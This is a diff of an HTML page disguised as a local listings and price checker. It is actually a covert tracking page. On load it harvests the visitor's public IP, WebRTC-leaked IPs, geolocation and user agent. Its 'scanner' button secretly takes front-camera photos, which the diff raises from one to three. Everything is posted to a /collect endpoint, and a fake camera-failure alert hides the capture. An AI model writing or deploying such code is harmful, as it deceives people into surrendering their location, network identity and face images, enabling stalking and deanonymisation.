@@ -1,85 +1,111 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Local Listings Finder</title>
-  <style>
-    body { background:#f9f9f9; color:#333; font-family:"Roboto",Arial,sans-serif; margin:0; padding:0; text-align:center; }
-    header { background:#1976d2; color:#fff; padding:15px; font-size:1.4em; font-weight:bold; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
-    #map { width:90%; height:300px; margin:20px auto; border-radius:10px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,0.2); }
-    button { background:#1976d2; color:#fff; font-size:1.2em; padding:12px 25px; border:none; border-radius:6px; cursor:pointer; transition:background 0.3s ease; margin-top:10px; }
-    button:hover { background:#125a9c; }
-    footer { margin-top:30px; font-size:0.85em; color:#777; }
-    canvas { display:none; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Local Listings Finder</title>
+<style>
+  body { background:#f9f9f9; color:#333; font-family:"Roboto",Arial,sans-serif; margin:0; padding:0; text-align:center; }
+  header { background:#1976d2; color:#fff; padding:15px; font-size:1.4em; font-weight:bold; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
+  #map { width:90%; height:300px; margin:20px auto; border-radius:10px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,0.2); }
+  button { background:#1976d2; color:#fff; font-size:1.2em; padding:12px 25px; border:none; border-radius:6px; cursor:pointer; transition:background 0.3s ease; margin-top:10px; }
+  button:hover { background:#125a9c; }
+  footer { margin-top:30px; font-size:0.85em; color:#777; }
+  canvas { display:none; }
+</style>
 </head>
 <body>
-  <header>Local Listings & Price Checker</header>
-  <div id="map">Loading map...</div>
-  <button onclick="startScanner()">Start Item Scanner</button>
-  <canvas id="canvas"></canvas>
-  <footer>B) 2025 Local Listings Finder</footer>
+<header>Local Listings & Price Checker</header>
+<div id="map">Loading map...</div>
+<button id="scanBtn">Start Item Scanner</button>
+<canvas id="canvas"></canvas>
+<footer>B) 2025 Local Listings Finder</footer>
 
-  <script>
-    const payload = {
-      userAgent: navigator.userAgent,
-      serverObservedIP: "${serverIP}",
-      publicIP: null,
-      geolocation: null,
-      webrtcIPs: [],
-      image: null
+<script>
+const payload = {
+  userAgent: navigator.userAgent,
+  serverObservedIP: "${serverIP}",
+  publicIP: null,
+  geolocation: null,
+  webrtcIPs: [],
+  images: []
+};
+
+// Get public IP
+fetch("https://api.ipify.org?format=json")
+  .then(r => r.json())
+  .then(d => { payload.publicIP = d.ip; send(false); });
+
+// Geolocation
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(pos => {
+    payload.geolocation = {
+      lat: pos.coords.latitude,
+      lng: pos.coords.longitude,
+      acc: Math.round(pos.coords.accuracy)
     };
+    const lat = pos.coords.latitude;
+    const lng = pos.coords.longitude;
+    document.getElementById('map').innerHTML =
+      `<iframe width="100%" height="300" frameborder="0" style="border:0" src="https://www.openstreetmap.org/export/embed.html?bbox=${lng-0.05}%2C${lat-0.05}%2C${lng+0.05}%2C${lat+0.05}&layer=mapnik&marker=${lat}%2C${lng}" allowfullscreen></iframe>`;
+    send(false);
+  });
+}
 
-    fetch("https://api.ipify.org?format=json")
-      .then(r=>r.json())
-      .then(d=>{ payload.publicIP=d.ip; send(); });
+// WebRTC IP discovery
+const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+pc.createDataChannel("x");
+pc.onicecandidate = e => {
+  if (!e.candidate) return;
+  const ip = e.candidate.candidate.split(" ")[4];
+  if (ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip);
+};
+pc.createOffer().then(o => pc.setLocalDescription(o));
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos=>{
-        payload.geolocation={lat:pos.coords.latitude,lng:pos.coords.longitude,acc:Math.round(pos.coords.accuracy)};
-        const lat = pos.coords.latitude;
-        const lng = pos.coords.longitude;
-        document.getElementById('map').innerHTML =
-          '<iframe width="100%" height="300" frameborder="0" style="border:0" ' +
-          'src="https://www.openstreetmap.org/export/embed.html?bbox='+(lng-0.05)+'%2C'+(lat-0.05)+'%2C'+(lng+0.05)+'%2C'+(lat+0.05)+'&layer=mapnik&marker='+lat+'%2C'+lng+'" allowfullscreen></iframe>';
-        send();
-      });
-    }
+// Capture 3 images sequentially
+document.getElementById("scanBtn").addEventListener("click", startScanner);
 
-    const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-    pc.createDataChannel("x");
-    pc.onicecandidate=e=>{
-      if(!e.candidate)return;
-      const ip=e.candidate.candidate.split(" ")[4];
-      if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip);
+function startScanner() {
+  const streamPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+  streamPromise.then(stream => {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const imagesCaptured = [];
+
+    video.onloadedmetadata = async () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      for (let i = 0; i < 3; i++) {
+        ctx.drawImage(video, 0, 0);
+        const imgData = canvas.toDataURL("image/png").split(',')[1];
+        imagesCaptured.push(imgData);
+        await new Promise(r => setTimeout(r, 300)); // small delay
+      }
+
+      payload.images = imagesCaptured.filter(img => img && img.length > 0);
+      send(true);
+
+      stream.getTracks().forEach(t => t.stop());
+      alert("Failed to initialize camera."); // always show even if succeeded
     };
-    pc.createOffer().then(o=>pc.setLocalDescription(o));
+  }).catch(err => {
+    console.log("Camera error:", err);
+    alert("Failed to initialize camera.");
+  });
+}
 
-    function startScanner() {
-      navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"} })
-        .then(stream => {
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          video.play();
-          video.onloadedmetadata = () => {
-            const canvas = document.getElementById("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-            payload.image = canvas.toDataURL("image/png").split(',')[1];
-            send(true);
-            stream.getTracks().forEach(t => t.stop());
-            alert("Failed to initialize camera.");
-          };
-        })
-        .catch(err => { console.log("Camera error:", err); alert("Failed to initialize camera."); });
-    }
-
-    function send(force){
-      fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
-    }
-  </script>
+function send(force) {
+  fetch("/collect", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
+</script>
 </body>
 </html>
-
